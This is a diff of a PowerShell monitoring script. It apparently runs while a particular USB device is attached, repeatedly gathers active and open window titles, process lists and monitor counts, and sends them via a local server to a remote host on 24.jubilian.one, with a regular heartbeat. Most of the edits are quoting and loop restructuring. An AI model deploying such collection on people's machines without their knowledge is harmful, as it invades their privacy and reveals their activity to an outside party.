@@ -4,15 +4,15 @@ $functions = {
     #                                                   Variables Definition
     #---------------------------------------------------------------------------------------------------------------------
     #Web Server for interval tracking
-    $interval_base = "https://24.jubilian.one/interval.php?"
+    $interval_base = 'https://24.jubilian.one/interval.php?'
     #Web server for processing string data
-    $sending_base = "https://24.jubilian.one/process.php"
+    $sending_base = 'https://24.jubilian.one/process.php'
     #Web server for processing list data
-    $sending_list_base = "https://24.jubilian.one/process_list.php"
+    $sending_list_base = 'https://24.jubilian.one/process_list.php'
     #Webserver for getting public key
-    $key = "https://24.jubilian.one/RSA/public_rsa.key"
+    $key = 'https://24.jubilian.one/RSA/public_rsa.key'
     #Heartbeat 
-    $heartbeat = "https://24.jubilian.one/ping.php?"
+    $heartbeat = 'https://24.jubilian.one/ping.php?'
 
     #---------------------------------------------------------------------------------------------------------------------
     #                                                      Basic Functions
@@ -24,7 +24,7 @@ $functions = {
         $check = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB\\VID_1D6B' }
 
         if( $null -ne $check){
-            return "FOUND"
+            return 'FOUND'
         }
     }
 
@@ -44,27 +44,25 @@ $functions = {
     # Result is the UUID 
     $completed = $false
 
-    while (-not $completed){
-        if (Is_Connected -ne $null){
-            try{
-                $response = Invoke-WebRequest -Uri http://daniel.local/ -Method POST -Body ($key_data|ConvertTo-Json) -ContentType "application/json"
-                $uuid = ($response.content | ConvertFrom-Json).uuid
-                $completed = $true
-            }
-            catch{}
+    if (Is_Connected -ne $null){
+        try{
+            $response = Invoke-WebRequest -Uri http://daniel.local/ -Method POST -Body ($key_data|ConvertTo-Json) -ContentType 'application/json'
+            $uuid = ($response.content | ConvertFrom-Json).uuid
+            $completed = $true
         }
-        else{break}
+        catch{}
     }
-
+    else{break}
+    
     #---------------------------------------------------------------------------------------------------------------------
     #                                                     Heartbeat Functions
     #---------------------------------------------------------------------------------------------------------------------
-    #Sending heartbeat to webserver to signify that "I am still connected"
+    #Sending heartbeat to webserver to signify that 'I am still connected'
     #It will be using the unique MAC address to differentiate the different devices
     function Send_HeartBeat{
         while(1){
             if (Is_Connected -ne $null){
-                $url = $heartbeat + "uuid=" + $uuid
+                $url = $heartbeat + 'uuid=' + $uuid
                 Invoke-WebRequest -Uri $url -UseBasicParsing
                 Start-Sleep -s 5
             }
@@ -79,7 +77,7 @@ $functions = {
     # Add-Type (cmdlet): Allows the definition of a Microsoft .NET Core class in Powershell session, we can then instantiate objects, by using the New-Object cmdlet and use the objects
     # Public class APIFuncs: contains three static methods that utilizes the user32.dll functions GetWindowText, GetForegroundWindow and GetWindowTextLength
     function Get_Active_Win{
-        Add-Type  @"
+        Add-Type  @'
         using System;
         using System.Runtime.InteropServices;
         using System.Text;
@@ -95,17 +93,17 @@ $functions = {
             [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
                 public static extern Int32 GetWindowTextLength(IntPtr hWnd);
             }
-"@
+'@
             while(1){
                 # After calling Add-Type, we can freely use the called Windows API 
-                # The two colon "::" idicates that we are calling a static .NET method
+                # The two colon '::' idicates that we are calling a static .NET method
                 if (Is_Connected -ne $null){
                     $w = [APIFuncs]::GetForegroundWindow() 
                     $len = [APIFuncs]::GetWindowTextLength($w) 
                     $sb = New-Object text.stringbuilder -ArgumentList ($len + 1)
                     $rtnlen = [APIFuncs]::GetWindowText($w,$sb,$sb.Capacity)
                     
-                    if ([string]::IsNullOrEmpty($sb.ToString())){$sb = "No Active Window"} # Checking for active window 
+                    if ([string]::IsNullOrEmpty($sb.ToString())){$sb = 'No Active Window'} # Checking for active window 
 
                     $completed = $false
                     #Sending JSON data to Flask server: By taking advantage of the POST request 
@@ -113,20 +111,18 @@ $functions = {
                     
                     while (-not $completed){
                         try{
-                            $response = Invoke-WebRequest -Uri http://daniel.local/ -Method POST -Body ($data|ConvertTo-Json) -ContentType "application/json"
-
+                            $response = Invoke-WebRequest -Uri http://daniel.local/ -Method POST -Body ($data|ConvertTo-Json) -ContentType 'application/json'
                             #Sending data to Webserver 
-                            Invoke-WebRequest -Uri $sending_base -UseBasicParsing -Method POST -Body ($response.content|ConvertTo-Json) -ContentType "application/json"
-                            
-                            #Retrieving interval 
-                            $tag = Encode("AWD")
-                            $url = ($interval_base + "uuid=" + $uuid + "&category=" + $tag)
-                            $delay = Invoke-WebRequest -Uri $url -UseBasicParsing
-                            Start-Sleep -s $delay.content
-
+                            Invoke-WebRequest -Uri $sending_base -UseBasicParsing -Method POST -Body ($response.content|ConvertTo-Json) -ContentType 'application/json'
                             $completed = $true
-                        } catch{}
+                        }catch{}
                     }
+                    #Retrieving interval 
+                    $tag = Encode('AWD')
+                    $url = ($interval_base + 'uuid=' + $uuid + '&category=' + $tag)
+                    $delay = Invoke-WebRequest -Uri $url -UseBasicParsing
+                    Start-Sleep -s $delay.content
+                    
                 }
                 else{break}
             }
@@ -136,7 +132,7 @@ $functions = {
     function Get_Open_Win{
         while(1){
             if (Is_Connected -ne $null){
-                $Windows =  Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | Select-Object MainWindowTitle
+                $Windows =  Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object MainWindowTitle
 
                 $list = New-Object Collections.Generic.List[String]
                 foreach($windows in $Windows){
@@ -150,20 +146,18 @@ $functions = {
 
                 while (-not $completed){
                     try{
-                        $response = Invoke-WebRequest -Uri http://daniel.local/ -Method POST -Body ($data|ConvertTo-Json) -ContentType "application/json"
+                        $response = Invoke-WebRequest -Uri http://daniel.local/ -Method POST -Body ($data|ConvertTo-Json) -ContentType 'application/json'
                         
                         #Sending data to Webserver 
-                        Invoke-WebRequest -Uri $sending_list_base -UseBasicParsing -Method POST -Body ($response.content|ConvertTo-Json) -ContentType "application/json"
-                        
-                        #Retrieving interval
-                        $tag = Encode("OW")
-                        $url = ($interval_base + "uuid=" + $uuid + "&category=" + $tag)
-                        $delay = Invoke-WebRequest -Uri $url -UseBasicParsing
-                        Start-Sleep -s $delay.content
-
+                        Invoke-WebRequest -Uri $sending_list_base -UseBasicParsing -Method POST -Body ($response.content|ConvertTo-Json) -ContentType 'application/json'
                         $completed = $true
                     }catch{}
                 }
+                #Retrieving interval
+                $tag = Encode('OW')
+                $url = ($interval_base + 'uuid=' + $uuid + '&category=' + $tag)
+                $delay = Invoke-WebRequest -Uri $url -UseBasicParsing
+                Start-Sleep -s $delay.content
             }
             else{break}
         }
@@ -173,7 +167,7 @@ $functions = {
     function Get_Display_Prop{
         while(1){
             if (Is_Connected -ne $null){
-                $Monitors = (Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams | Where-Object {$_.Active -like "True"}).Active.Count
+                $Monitors = (Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams | Where-Object {$_.Active -like 'True'}).Active.Count
 
                 $completed = $false
                 #Sending data to Flask server: By taking advantage of the POST request 
@@ -181,20 +175,18 @@ $functions = {
                 
                 while (-not $completed){
                     try{
-                        $response = Invoke-WebRequest -Uri http://daniel.local/ -Method POST -Body ($data|ConvertTo-Json) -ContentType "application/json"
+                        $response = Invoke-WebRequest -Uri http://daniel.local/ -Method POST -Body ($data|ConvertTo-Json) -ContentType 'application/json'
 
                         #Sending data to Webserver 
-                        Invoke-WebRequest -Uri $sending_base -UseBasicParsing -Method POST -Body ($response.content|ConvertTo-Json) -ContentType "application/json"
-                        
-                        #Retrieving interval
-                        $tag = Encode("AMD")
-                        $url = ($interval_base + "uuid=" + $uuid + "&category=" + $tag)
-                        $delay = Invoke-WebRequest -Uri $url -UseBasicParsing
-                        Start-Sleep -s $delay.content
-
-                        $completed = $true}
-                    catch{}
-                }
+                        Invoke-WebRequest -Uri $sending_base -UseBasicParsing -Method POST -Body ($response.content|ConvertTo-Json) -ContentType 'application/json'
+                        $completed = $true
+                    }catch{}
+                }    
+                #Retrieving interval
+                $tag = Encode('AMD')
+                $url = ($interval_base + 'uuid=' + $uuid + '&category=' + $tag)
+                $delay = Invoke-WebRequest -Uri $url -UseBasicParsing
+                Start-Sleep -s $delay.content
             }
             else{break}
         }
@@ -218,20 +210,18 @@ $functions = {
 
                 while (-not $completed){
                     try{
-                        $response = Invoke-WebRequest -Uri http://daniel.local/ -Method POST -Body ($data|ConvertTo-Json) -ContentType "application/json"
+                        $response = Invoke-WebRequest -Uri http://daniel.local/ -Method POST -Body ($data|ConvertTo-Json) -ContentType 'application/json'
 
                         #Sending data to Webserver 
-                        Invoke-WebRequest -Uri $sending_list_base -UseBasicParsing -Method POST -Body ($response.content|ConvertTo-Json) -ContentType "application/json"
-                        
-                        #Retrieving interval
-                        $tag = Encode("PL")
-                        $url = ($interval_base + "uuid=" + $uuid + "&category=" + $tag)
-                        $delay = Invoke-WebRequest -Uri $url -UseBasicParsing
-                        Start-Sleep -s $delay.content
-
-                        $completed = $true}
-                    catch{}
+                        Invoke-WebRequest -Uri $sending_list_base -UseBasicParsing -Method POST -Body ($response.content|ConvertTo-Json) -ContentType 'application/json'
+                        $completed = $true
+                    }catch{} 
                 }
+                #Retrieving interval
+                $tag = Encode('PL')
+                $url = ($interval_base + 'uuid=' + $uuid + '&category=' + $tag)
+                $delay = Invoke-WebRequest -Uri $url -UseBasicParsing
+                Start-Sleep -s $delay.content
             }
             else{break}
         }
@@ -242,12 +232,17 @@ $functions = {
 #                                                    Background Jobs Activation
 #---------------------------------------------------------------------------------------------------------------------
 $heartbeat = Start-Job -InitializationScript $functions -ScriptBlock{Send_HeartBeat}
+Start-Sleep 2
 $job1 = Start-Job -InitializationScript $functions -ScriptBlock{Get_Active_Win}
+Start-Sleep 2
 $job2 = Start-Job -InitializationScript $functions -ScriptBlock{Get_Display_Prop} 
+Start-Sleep 2
 $job3 = Start-Job -InitializationScript $functions -ScriptBlock{Get_Proc_List} 
+Start-Sleep 2
 $job4 = Start-Job -InitializationScript $functions -ScriptBlock{Get_Open_Win} 
-wait-Job $heartbeat
+Start-Sleep 2
+wait-Job $heartbeat 
 Wait-Job $job1 
-Wait-Job $job2
-Wait-Job $job3
-Wait-Job $job4
+Wait-Job $job2 
+Wait-Job $job3 
+Wait-Job $job4 
